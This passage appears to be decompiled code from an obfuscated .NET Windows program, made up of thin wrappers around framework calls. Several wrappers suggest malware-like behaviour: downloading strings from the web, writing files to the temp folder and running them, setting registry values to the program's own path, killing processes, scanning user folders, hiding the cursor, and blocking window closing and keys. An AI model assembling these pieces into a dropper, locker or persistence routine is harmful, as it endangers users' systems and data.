	{
		control_0.remove_Click(eventHandler_0);
	}

	static void smethod_27(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static int smethod_28(CreateParams createParams_0)
	{
		return createParams_0.get_ClassStyle();
	}

	static void smethod_29(CreateParams createParams_0, int int_0)
	{
		createParams_0.set_ClassStyle(int_0);
	}

	static MsgBoxResult smethod_30(object object_0, MsgBoxStyle msgBoxStyle_0, object object_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		return Interaction.MsgBox(object_0, msgBoxStyle_0, object_1);
	}

	static CloseReason smethod_31(FormClosingEventArgs formClosingEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return formClosingEventArgs_0.get_CloseReason();
	}

	static void smethod_32(CancelEventArgs cancelEventArgs_0, bool bool_0)
	{
		cancelEventArgs_0.Cancel = bool_0;
	}

	static string smethod_33(WebClient webClient_1, string string_0)
	{
		return webClient_1.DownloadString(string_0);
	}

	static void smethod_34(Exception exception_0)
	{
		ProjectData.SetProjectError(exception_0);
	}

	static void smethod_35()
	{
		ProjectData.ClearProjectError();
	}

	static bool smethod_36(string string_0)
	{
		return File.Exists(string_0);
	}

	static bool smethod_37()
	{
		return Environment.Is64BitOperatingSystem;
	}

	static void smethod_38(Form form_0)
	{
		form_0.Close();
	}

	static void smethod_39(Timer timer_5)
	{
		timer_5.Start();
	}

	static void smethod_40(Control control_0)
	{
		control_0.Hide();
	}

	static string smethod_41(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_42(Label label_0, string string_0)
	{
		label_0.set_Text(string_0);
	}

	static Random smethod_43()
	{
		return new Random();
	}

	static int smethod_44(string string_0)
	{
		return string_0.Length;
	}

	static int smethod_45(Random random_0, int int_0, int int_1)
	{
		return random_0.Next(int_0, int_1);
	}

	static string smethod_46(int int_0)
	{
		return Conversions.ToString(int_0);
	}

	static string smethod_47(Label label_0)
	{
		return label_0.get_Text();
	}

	static int smethod_48(string string_0)
	{
		return Conversions.ToInteger(string_0);
	}

	static char smethod_49(string string_0, int int_0)
	{
		return string_0[int_0];
	}

	static string smethod_50(char char_0)
	{
		return Conversions.ToString(char_0);
	}

	static string smethod_51(TextBox textBox_0)
	{
		return textBox_0.get_Text();
	}

	static double smethod_52(string string_0)
	{
		return Conversions.ToDouble(string_0);
	}

	static void smethod_53(Control control_0, bool bool_0)
	{
		control_0.set_Visible(bool_0);
	}

	static void smethod_54(TextBoxBase textBoxBase_0, int int_0)
	{
		textBoxBase_0.set_SelectionStart(int_0);
	}

	static void smethod_55(RichTextBox richTextBox_0, int int_0)
	{
		richTextBox_0.set_SelectionLength(int_0);
	}

	static Font smethod_56(string string_0, float float_0, FontStyle fontStyle_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0);
	}

	static void smethod_57(RichTextBox richTextBox_0, Font font_0)
	{
		richTextBox_0.set_SelectionFont(font_0);
	}

	static void smethod_58(Timer timer_5)
	{
		timer_5.Stop();
	}

	static void smethod_59(Timer timer_5, int int_0)
	{
		timer_5.set_Interval(int_0);
	}

	static Audio smethod_60(Computer computer_0)
	{
		return computer_0.get_Audio();
	}

	static void smethod_61(Audio audio_0)
	{
		audio_0.Stop();
	}

	static void smethod_62(Audio audio_0, Stream stream_0, AudioPlayMode audioPlayMode_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		audio_0.Play(stream_0, audioPlayMode_0);
	}

	IntPtr method_65()
	{
		return ((Control)this).get_Handle();
	}

	static FileStream smethod_63(string string_0)
	{
		return File.Create(string_0);
	}

	static UTF8Encoding smethod_64(bool bool_0)
	{
		return new UTF8Encoding(bool_0);
	}

	static byte[] smethod_65(Encoding encoding_0, string string_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	static void smethod_66(FileStream fileStream_0, byte[] byte_0, int int_0, int int_1)
	{
		fileStream_0.Write(byte_0, int_0, int_1);
	}

	static void smethod_67(Stream stream_0)
	{
		stream_0.Close();
	}

	static void smethod_68()
	{
		Cursor.Hide();
	}

	static void smethod_69()
	{
		Cursor.Show();
	}

	static Keys smethod_70(KeyEventArgs keyEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return keyEventArgs_0.get_KeyData();
	}

	static string smethod_71()
	{
		return Environment.NewLine;
	}

	static string smethod_72(string[] string_0)
	{
		return string.Concat(string_0);
	}

	static DialogResult smethod_73(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0, messageBoxIcon_0);
	}

	static void smethod_74(KeyEventArgs keyEventArgs_0, bool bool_0)
	{
		keyEventArgs_0.set_Handled(bool_0);
	}

	static string smethod_75(object object_0)
	{
		return Conversions.ToString(object_0);
	}

	static string smethod_76(double double_0)
	{
		return Conversions.ToString(double_0);
	}

	static int smethod_77(string string_0, string string_1, bool bool_0)
	{
		return Operators.CompareString(string_0, string_1, bool_0);
	}

	static FileSystemProxy smethod_78(ServerComputer serverComputer_0)
	{
		return serverComputer_0.get_FileSystem();
	}

	static SpecialDirectoriesProxy smethod_79(FileSystemProxy fileSystemProxy_0)
	{
		return fileSystemProxy_0.get_SpecialDirectories();
	}

	static string smethod_80(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_Temp();
	}

	static void smethod_81(string string_0, byte[] byte_0)
	{
		File.WriteAllBytes(string_0, byte_0);
	}

	static Process smethod_82(string string_0)
	{
		return Process.Start(string_0);
	}

	static void smethod_83(Control control_0)
	{
		control_0.Show();
	}

	static string smethod_84(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyDocuments();
	}

	static ReadOnlyCollection<string> smethod_85(FileSystemProxy fileSystemProxy_0, string string_0, SearchOption searchOption_0, string[] string_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return fileSystemProxy_0.GetDirectories(string_0, searchOption_0, string_1);
	}

	static ReadOnlyCollection<string> smethod_86(FileSystemProxy fileSystemProxy_0, string string_0)
	{
		return fileSystemProxy_0.GetFiles(string_0);
	}

	static bool smethod_87(string string_0, string string_1)
	{
		return string_0.EndsWith(string_1);
	}

	static ObjectCollection smethod_88(ListBox listBox_0)
	{
		return listBox_0.get_Items();
	}

	static int smethod_89(ObjectCollection objectCollection_0, object object_0)
	{
		return objectCollection_0.Add(object_0);
	}

	static bool smethod_90(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	static string smethod_91(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyMusic();
	}

	static string smethod_92(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyPictures();
	}

	static string smethod_93()
	{
		return Environment.UserName;
	}

	static string smethod_94(string string_0, string string_1, string string_2)
	{
		return string_0 + string_1 + string_2;
	}

	static void smethod_95(Control control_0)
	{
		control_0.Hide();
	}

	static Point smethod_96(Form form_0)
	{
		return form_0.get_Location();
	}

	static Process[] smethod_97(string string_0)
	{
		return Process.GetProcessesByName(string_0);
	}

	static void smethod_98(Process process_0)
	{
		process_0.Kill();
	}

	static object smethod_99(string string_0, string string_1)
	{
		return Interaction.CreateObject(string_0, string_1);
	}

	static object smethod_100(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static object smethod_101(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0, bool bool_1)
	{
		return NewLateBinding.LateCall(object_0, type_0, string_0, object_1, string_1, type_1, bool_0, bool_1);
	}

	static RegistryKey smethod_102(RegistryKey registryKey_0, string string_0, bool bool_0)
	{
		return registryKey_0.OpenSubKey(string_0, bool_0);
	}

	static string smethod_103()
	{
		return Application.get_ExecutablePath();
	}

	static void smethod_104(RegistryKey registryKey_0, string string_0, object object_0)
	{
		registryKey_0.SetValue(string_0, object_0);
	}

	static Process smethod_105(string string_0, string string_1)
	{
		return Process.Start(string_0, string_1);
	}

	static RegistryKey smethod_106(RegistryKey registryKey_0, string string_0, RegistryKeyPermissionCheck registryKeyPermissionCheck_0)
	{
		return registryKey_0.CreateSubKey(string_0, registryKeyPermissionCheck_0);
	}

	static void smethod_107(RegistryKey registryKey_0)
	{
		registryKey_0.Close();
	}
}
